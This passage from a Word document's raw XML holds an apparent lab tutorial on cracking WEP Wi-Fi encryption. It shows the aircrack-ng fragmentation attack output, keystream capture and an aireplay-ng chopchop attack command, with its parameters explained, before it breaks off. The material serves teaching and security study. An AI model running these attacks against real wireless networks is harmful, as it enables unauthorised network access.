        </w:rPr>
        <w:t>..;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6C3CF449"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0x0040:  8244 5882 d5cc 7a1f 2b9b 3ef0 ee0f 4fb5  .DX...z</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.+</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.&gt;...O.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79748954"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0x0050:  4563 906d 0d90 88c4 5532 a602 a8ea </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">f8e2  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Ec.m</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....U2......</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C5629D"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0x0060:  c531 e214 2b28 fc19 b9a8 226d 9c71 6ab1  .1</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>+(...."</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.qj</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D64E7B1"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0x0070:  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>9c9f                                     ..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="03195629"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0B02BC" w14:textId="77777777" w:rsidR="004652D1"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Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2ABE78ED" w14:textId="77777777" w:rsidR="0038547B" w:rsidRPr="0038547B" w:rsidRDefault="0038547B" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0774EE13"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When a packet from the access point arrives, enter “y” to proceed. You may need to try a few different packets from the AP to be successful. These packets have ”“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>: 1”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDDF830"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When successful, the system responds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D87267F"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Pr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Saving chosen packet in replay_src-0203-180328.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DCC6E7"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Data packet found!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C773FE"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Sending fragmented packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B9BC93"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Got RELAYED packet!!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A84436C"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Thats</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> our ARP packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1B4EE9"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Trying to get 384 bytes of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="55AF4830"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Got RELAYED packet!!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407149E8"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Thats</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> our ARP packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552D1568"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Trying to get 1500 bytes of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3D9B259A"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Got RELAYED packet!!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03FE513A"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Thats</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> our ARP packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7ECE19"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Saving </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> in fragment-0203-180343.xor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B57F7A" w14:textId="77777777" w:rsidR="004652D1"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Now you can build a packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> out of that 1500 bytes </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6831F5A3" w14:textId="77777777" w:rsidR="0038547B" w:rsidRPr="0038547B" w:rsidRDefault="0038547B" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C502F7C" w14:textId="77777777" w:rsidR="00E46969" w:rsidRDefault="00E46969" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AE868D3" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="002463D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Success! The file “fragment-0203-180343.xor” can then be used in the next step</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA94A60" w14:textId="77777777" w:rsidR="0038547B" w:rsidRDefault="0038547B" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="210A4A16"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">If the fragmentation attack was not successful, you can then try the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> technique next. Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7966B66B" w14:textId="77777777" w:rsidR="006B5219" w:rsidRDefault="006B5219" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75C8DB46" w14:textId="5C1DAC45" w:rsidR="00F37B2B" w:rsidRPr="0070331F" w:rsidRDefault="006B5219" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0070331F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>CHOPCHOP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C8E2E5" w14:textId="3590F7BA" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3BA232" w14:textId="77777777" w:rsidR="00F37B2B" w:rsidRPr="00F37B2B" w:rsidRDefault="00F37B2B" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FB527D0"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C50804" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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 xml:space="preserve">-4 means the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D156CC" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FBA5AE" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0FC852" w14:textId="15D058B7" w:rsidR="004652D1" w:rsidRDefault="00277615" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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sidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E84CFE7"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The system responds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3828A0CB"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Pr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Read 165 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AD575A"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p>
    <w:p w14:paraId="59FCD5BC"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Size: 86, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A0766C"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DEBE101"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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6D23C00C"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
